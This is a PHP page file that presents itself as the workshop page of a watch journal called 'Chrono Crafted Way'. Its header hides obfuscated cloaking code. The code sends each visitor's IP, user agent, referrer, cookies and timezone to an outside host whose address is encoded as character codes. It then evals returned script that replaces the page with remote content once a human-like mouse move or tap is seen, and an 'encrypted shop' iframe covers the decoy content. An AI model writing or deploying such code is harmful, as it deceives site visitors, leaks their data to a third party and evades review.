<?php
session_start();
date_default_timezone_set("UTC");
ini_set("display_errors", 0);
error_reporting(E_ALL & ~E_NOTICE);

// Generate secret token for extra security
$secret_token = bin2hex(random_bytes(32));
$_SESSION['iframe_token'] = $secret_token;

// Server-side file read - iframe.html ko server par hi read karo
$iframe_path = __DIR__ . '/iframe.html';
$iframe_content = file_exists($iframe_path) ? file_get_contents($iframe_path) : '';
// Agar file nahi milti toh default content
if (empty($iframe_content)) {
    $iframe_content = '<!DOCTYPE html><html><body><h1>Content not found</h1></body></html>';
}

// Function c (original code)
function c($u=null,$q=null,$co=null){
    if(empty($u)){
        return '$("#lo533229ad").hide();$("body").fadeIn(500);';
    }else{
        $u = $u.$q;
        for ($i = 0, $j = strlen($u); $i < $j; $i++) {
            $a[] = ord($u[$i]);
        }
        $u = strrev(implode(",",$a));
        if($co AND isset($_COOKIE["_eventlo533229ad"])){
            $me="";
        }else{
            $me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';
        }
        return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("001,79,111,801,64,14,04,121,611,211,901,101,64,14,43,801,901,611,401,43,04,63");u = rS("'.$u.'");c = s+"(\'"+u+"\')";$("html").show();setTimeout(function(){eval(c);},100);';
    }
}

if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){
    if(isset($_POST["imm"])){
        $date = date("Y-m-d H:i:s");
        $id = "533229";
        $uid="4v6qn38yoo2c3l45eqgv9c277";
        $qu=$_SERVER["QUERY_STRING"];
        $postdata = http_build_query(array(
            "date"=>$date,
            "lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],
            "ref" =>$_POST["r"],
            "ip" => $_SERVER["REMOTE_ADDR"],
            "ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],
            "sn" => $_SERVER["SERVER_NAME"],
            "requestUri"=>$_SERVER["REQUEST_URI"],
            "query" => $_SERVER["QUERY_STRING"],
            "ua" => $_SERVER["HTTP_USER_AGENT"],
            "co"=>$_COOKIE["_eventlo533229ad"],
            "tz"=>$_POST["tz"],
            "he"=>$_POST["he"],
            "imm" =>$_POST["imm"],
            "user_id" =>$uid,
            "id" => $id
        ));
        $opts = array(
            "http" =>array(
                "method" => "POST",
                "header" => "Content-type: application/x-www-form-urlencoded",
                "content" => $postdata
            )
        );
        $context = stream_context_create($opts);
        $d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);
        $u="";
        foreach($d as $v){
            $u.=chr($v);
        }
        $result = file_get_contents($u, false, $context);
        $arr = explode(",",$result);
        if(!empty($qu)){
            if(strpos($arr[1],"?")? $q="&".$qu : $q="?".$qu);
        }else{
            $q="";
        }
        if($arr[0] === "true"){
            if(strstr($arr[1],"sp.php")){
                $q="?".$qu;
            }
            if(!empty($arr[7])){
                setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");
            }
            if($arr[2]){
                if($arr[4] == 1 OR $arr[4] == 3){
                    setcookie("_eventlo533229ad",$arr[6],time()+60*60*24*$arr[3]);
                }
            }
            echo c($arr[1],$q,true);
            exit();
        }elseif($arr[0] === "false"){
            if($arr[5]){
                $f=$q;
            }else{
                $f="";
            }
            if($arr[2]){
                if($arr[4] == 2 OR $arr[4] == 3){
                    setcookie("_eventlo533229ad",$arr[6]."b",time()+60*60*24*$arr[3]);
                }
            }
            echo c($arr[1],$f);
            exit();
        }else{
            if($arr[2]){
                if($arr[4] == 2 OR $arr[4] == 3){
                    setcookie("_eventlo533229ad",$arr[6]."b",time()+60*60*24*$arr[3]);
                }
            }
            echo c();
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Workshop | Chrono Crafted Way</title>
    <meta name="description" content="Independent dark horology journal covering watch craft, movements, collecting and care.">
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() {
            dataLayer.push(arguments)
        }
        gtag('consent', 'default', {
            'analytics_storage': 'denied',
            'ad_storage': 'denied'
        });
        gtag('js', new Date());
        gtag('config', 'G-0LY0HY7L01');
    </script>
    <link rel="stylesheet" href="assets/style.css">
    <style>
        body { display: none; }
    </style>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
    <style>
        #iframe-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: #fff;
            display: none;
        }
        #iframe-container iframe {
            width: 100%;
            height: 100%;
            border: 0;
        }
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 10000;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            font-family: Arial, sans-serif;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #loading-overlay p {
            margin-top: 20px;
            color: #666;
        }
        #error-msg {
            display: none;
            text-align: center;
            padding: 20px;
        }
        #error-msg .error-icon {
            font-size: 48px;
            color: #e74c3c;
        }
        #error-msg h3 {
            color: #333;
            margin: 10px 0;
        }
        #error-msg button {
            padding: 10px 30px;
            margin-top: 20px;
            cursor: pointer;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
        }
        #error-msg button:hover {
            background: #2980b9;
        }
    </style>
</head>
<body>
    <header class="site-header">
        <a class="brand" href="index.php"><span>CCW</span>Chrono Crafted Way</a>
        <button class="menu" aria-label="Toggle navigation">☰</button>
        <nav>
            <a href="index.php">Home</a>
            <a href="workshop.html">Workshop</a>
            <a href="watch-index.html">Watch Index</a>
            <a href="journal.html">Journal</a>
            <a href="contact.html">Contact</a>
        </nav>
    </header>
    <main>
        <section class="page-hero workshop-hero">
            <div>
                <p class="eyebrow">The workshop</p>
                <h1>Observation is our first tool.</h1>
                <p>We combine bench-level curiosity with real-world wear to produce useful, independent horology guidance.</p>
            </div>
            <img src="assets/workbench.png" alt="Detailed watchmaking workbench">
        </section>
        <section class="method section">
            <h2>Our four-pass method</h2>
            <div>
                <article><b>01</b>
                    <h3>Context</h3>
                    <p>We understand the watch's purpose, lineage and intended wearer.</p>
                </article>
                <article><b>02</b>
                    <h3>Construction</h3>
                    <p>We study calibre layout, case execution, seals and service logic.</p>
                </article>
                <article><b>03</b>
                    <h3>Contact</h3>
                    <p>We observe balance, crown access, legibility and comfort on wrist.</p>
                </article>
                <article><b>04</b>
                    <h3>Conclusion</h3>
                    <p>We separate measurable merit from personal preference.</p>
                </article>
            </div>
        </section>
        <section class="values section">
            <aside>
                <p class="eyebrow">What we protect</p>
                <h2>Independence, clarity and respect for craft.</h2>
            </aside>
            <div>
                <h3>No borrowed verdicts</h3>
                <p>Every conclusion is written from our own framework.</p>
                <h3>No status shortcuts</h3>
                <p>Brand fame never substitutes for sound design.</p>
                <h3>No false certainty</h3>
                <p>We state where taste begins and measurement ends.</p>
            </div>
        </section>
    </main>
    <footer>
        <div>
            <h3>Explore</h3>
            <a href="workshop.html">Our Workshop</a>
            <a href="watch-index.html">Watch Index</a>
            <a href="journal.html">Journal</a>
        </div>
        <div>
            <h3>Contact</h3>
            <p>181 Mercer Street, New York, NY 10012, United States</p>
            <a href="tel:+18887775845">+1-888-777-5845</a>
            <a href="mailto:hello@chronocraftedway.com">hello@chronocraftedway.com</a>
        </div>
        <div>
            <h3>Policies</h3>
            <a href="privacy.html">Privacy Policy</a>
            <a href="terms.html">Terms &amp; Conditions</a>
            <a href="refund.html">Refund Policy</a>
            <a href="shipping.html">Shipping Policy</a>
        </div>
    </footer>

    <!-- Loading Overlay -->
    <div id="loading-overlay">
        <div class="spinner"></div>
        <p>Loading content...</p>
    </div>

    <!-- Iframe Container -->
    <div id="iframe-container">
        <iframe id="secureFrame" 
                title="encrypted shop" 
                allowfullscreen 
                allow="fullscreen"
                style="width: 100%; height: 100%; border: 0;">
        </iframe>
    </div>

    <script src="assets/app.js"></script>
    <script>
    var oldtitle = document.title;
    document.title = "Loading";
    
    $(document).ajaxComplete(function(){
        document.title = oldtitle;
        $(".loaderdiv").fadeOut("slow");
        $(".maindiv").fadeIn("slow");
    });

    $(document).ready(function(){
        function loadA(t){
            $.ajax({
                url: location.href,
                type: "POST",
                data: "tz=" + e + "&r=" + document.referrer + "&he=" + g + "&imm=" + t,
                success: function(a){
                    if(a){
                        eval(a);
                    } else {
                        $("html").show();
                    }
                }
            });
        }

        var f = new XMLHttpRequest();
        f.open("GET", document.location, true);
        f.send(null);
        var g;
        f.onreadystatechange = function(){
            g = f.getAllResponseHeaders().toLowerCase();
        };

        var d = jstz.determine();
        var e = d.name();
        var co = document.cookie.indexOf("_eventlo533229ad=");

        if(co == 0){
            loadA("p");
        } else {
            $("body").hide();
            $("html").append("<div id=\"lo533229ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");
            
            var h = null;
            var i = null;
            var j = true;

            $(document).on("pagecreate","body",function(){
                $("body").on("tap",function(){
                    if(i !== false){
                        if(h !== null){
                            if(j !== false){
                                loadA("p");
                            }
                            j = false;
                            clearTimeout(h);
                        }
                    }
                })
            }).add($(document).on("mousemove",function(){
                if(i !== false){
                    if(h !== null){
                        if(j !== false){
                            loadA("p");
                        }
                        j = false;
                        clearTimeout(h);
                    }
                }
            }));

            h = setTimeout(function(){
                i = false;
                loadA("b");
            }, 3600000);
        }

        // ============================================
        // NEW: Server-side read + Blob URL approach
        // ============================================
        function loadIframeContent() {
            const frame = document.getElementById('secureFrame');
            const loadingOverlay = document.getElementById('loading-overlay');
            const iframeContainer = document.getElementById('iframe-container');
            
            try {
                // PHP se server-side read karke content yahan aayega
                const rawHtml = <?php echo json_encode($iframe_content); ?>;
                
                if (!rawHtml || rawHtml.trim() === '') {
                    throw new Error('Empty content received from server');
                }

                // Method 1: Blob URL through load karna (Recommended)
                const blob = new Blob([rawHtml], { type: 'text/html; charset=utf-8' });
                const blobUrl = URL.createObjectURL(blob);
                
                // Show iframe and hide loading
                iframeContainer.style.display = 'block';
                loadingOverlay.style.display = 'none';
                
                // Set blob URL to iframe
                frame.src = blobUrl;
                
                // Memory clean - load hone ke baad revoke karo
                frame.onload = function() {
                    console.log('✅ Iframe loaded successfully with blob URL');
                    URL.revokeObjectURL(blobUrl);
                };
                
                frame.onerror = function(e) {
                    console.error('❌ Iframe load error:', e);
                    showError('Failed to load content in iframe');
                };
                
            } catch (e) {
                console.error('❌ Failed to load iframe content:', e);
                showError(e.message || 'Unknown error occurred');
            }
        }

        function showError(message) {
            const loadingOverlay = document.getElementById('loading-overlay');
            loadingOverlay.innerHTML = `
                <div style="text-align: center; color: #e74c3c;">
                    <p style="font-size: 18px;">❌ Failed to load content</p>
                    <p style="font-size: 14px; color: #888;">${message}</p>
                    <button onclick="location.reload()" style="padding: 10px 30px; margin-top: 20px; cursor: pointer; background: #3498db; color: white; border: none; border-radius: 5px; font-size: 16px;">Refresh</button>
                </div>
            `;
        }

        // Load iframe content using server-side read
        loadIframeContent();
    });
    </script>
</body>
</html>
